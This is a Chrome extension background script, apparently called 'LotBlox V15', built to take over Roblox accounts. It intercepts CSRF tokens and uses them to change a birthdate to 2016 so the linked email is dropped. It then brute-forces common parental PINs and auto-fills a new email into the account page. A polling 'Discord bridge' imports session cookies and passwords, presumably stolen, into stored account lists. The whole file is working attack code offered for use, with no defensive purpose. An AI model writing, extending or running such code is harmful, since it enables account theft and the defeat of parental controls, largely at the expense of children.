chrome.runtime.onInstalled.addListener(() => console.log("LotBlox V15 Ready"));
let cachedCsrf = "";
chrome.webRequest.onSendHeaders.addListener((d)=>{for(let h of d.requestHeaders){if(h.name.toUpperCase()==="X-CSRF-TOKEN")cachedCsrf=h.value;}},{urls:["*://*.roblox.com/*"]},["requestHeaders"]);
async function getCsrfToken(){if(cachedCsrf)return cachedCsrf;try{await fetch("https://auth.roblox.com/v2/logout",{method:"POST"});}catch(e){return cachedCsrf;}return cachedCsrf;}

chrome.runtime.onMessage.addListener(async (msg, sender, sendResponse) => {

    // --- SMART UNLINKER V15 ---
    if (msg.type === "UNLINK_EMAIL_GLITCH") {
        const csrf = await getCsrfToken();
        if (!csrf) return alertUser("No Token Found. Refresh page.");

        alertUser("Checking Account Status...");

        try {
            const ageRes = await fetch("https://voice.roblox.com/v1/settings", { method: "GET" });
            const ageData = await ageRes.json();
            if (ageData.isVoiceEnabled || ageData.isVerifiedForVoice) {
                alertUser("❌ Failed: Account is ID Verified. Cannot change age.");
                return;
            }
        } catch(e) {}

        try {
            alertUser("Attempting Age Glitch (Target: 2016)...");
            const res = await fetch("https://users.roblox.com/v1/birthdate", {
                method: "POST",
                headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": csrf },
                body: JSON.stringify({ birthMonth: 1, birthDay: 1, birthYear: 2016, password: msg.password })
            });

            if (res.ok) {
                alertUser("✅ Success! Age set to <13. Email should be unlinked.");
                chrome.tabs.reload();
            } else {
                const err = await res.json();
                if (res.status === 403 && JSON.stringify(err).includes("Token")) {
                    alertUser("⚠️ Failed: 2FA enabled. You need the old email code to change age.");
                } else if (err.errors && err.errors[0].code === 6) {
                    alertUser("⚠️ Parent PIN Detected. Trying common PINs...");
                    await tryBruteForcePin(csrf);
                } else {
                    alertUser(`Failed: ${err.errors?.[0]?.message || "Unknown Error"}`);
                }
            }
        } catch (e) { alertUser("Network Error"); }
    }

    if (msg.type === "AUTO_FILL_EMAIL") {
        const tab = await chrome.tabs.create({ url: "https://www.roblox.com/my/account#!/info" });
        chrome.tabs.onUpdated.addListener(function listener(tabId, info) {
            if (tabId === tab.id && info.status === 'complete') {
                chrome.tabs.onUpdated.removeListener(listener);
                chrome.scripting.executeScript({
                    target: { tabId: tabId },
                    func: (email, pass) => {
                        const editBtn = document.querySelector('#email-info .icon-edit') || document.querySelector('button[aria-label="Edit Email"]');
                        if (editBtn) editBtn.click();
                        setTimeout(() => {
                            const emailInput = document.getElementById('email-address-input') || document.querySelector('input[name="emailAddress"]');
                            const passInput = document.getElementById('password-input') || document.querySelector('input[name="password"]');
                            if (emailInput) { emailInput.value = email; emailInput.dispatchEvent(new Event('input', { bubbles: true })); }
                            if (passInput) { passInput.value = pass; passInput.dispatchEvent(new Event('input', { bubbles: true })); }
                            alert("Auto-Filled! Please verify captcha.");
                        }, 1000);
                    },
                    args: [msg.email, msg.password]
                });
            }
        });
    }
});

async function tryBruteForcePin(csrf) {
    const pins = ["0000", "1234", "1111", "12345"];
    for (const pin of pins) {
        try {
            await fetch("https://auth.roblox.com/v1/account/pin/unlock", {
                method: "POST", headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": csrf },
                body: JSON.stringify({ pin: pin })
            });
        } catch(e) {}
    }
}

function alertUser(text) { chrome.notifications.create({ type: 'basic', iconUrl: 'icon.png', title: 'LotBlox', message: text }); }

// --- DISCORD BRIDGE ---
setInterval(async () => {
    try {
        const r = await fetch("http://localhost:3000/get-command");
        const d = await r.json();
        if (d.command === "ADD_ACCOUNT" && d.cookie) await saveAccount(d.cookie, null, null);
        if (d.command === "ADD_LOGIN" && d.username && d.password) await saveAccount(null, d.username, d.password);
    } catch (e) {}
}, 3000);

async function saveAccount(cookie, username, password) {
    try {
        let accName = username || "Discord Import";
        let accAvatar = "https://tr.rbxcdn.com/5359b36263720760f380757a793c1214/150/150/AvatarHeadshot/Png";
        let accId = null;
        if (!cookie && username) {
            try {
                const idRes = await fetch("https://users.roblox.com/v1/usernames/users", { method: "POST", body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }), headers: { "Content-Type": "application/json" } });
                const idData = await idRes.json();
                if (idData.data && idData.data.length > 0) { accId = idData.data[0].id; accName = idData.data[0].name; }
            } catch (e) {}
        }
        if (accId) {
            const tRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${accId}&size=150x150&format=Png&isCircular=true`);
            const t = await tRes.json();
            if(t.data) accAvatar = t.data[0].imageUrl;
        }
        const data = await chrome.storage.local.get("lotblox_accs");
        const accounts = data.lotblox_accs || [];
        const existing = accounts.find(a => a.name === accName);
        if (!existing) {
            accounts.push({ name: accName, cookie: cookie || "", password: password || "", robux: cookie ? "Click to Load" : "No Cookie", avatar: accAvatar, secret: "", valid: true });
            await chrome.storage.local.set({ lotblox_accs: accounts });
            alertUser(`Saved: ${accName}`);
        } else {
            if(password && !existing.password) {
                existing.password = password;
                await chrome.storage.local.set({ lotblox_accs: accounts });
                alertUser(`Updated Password for ${accName}`);
            }
        }
    } catch (err) { console.error(err); }
}
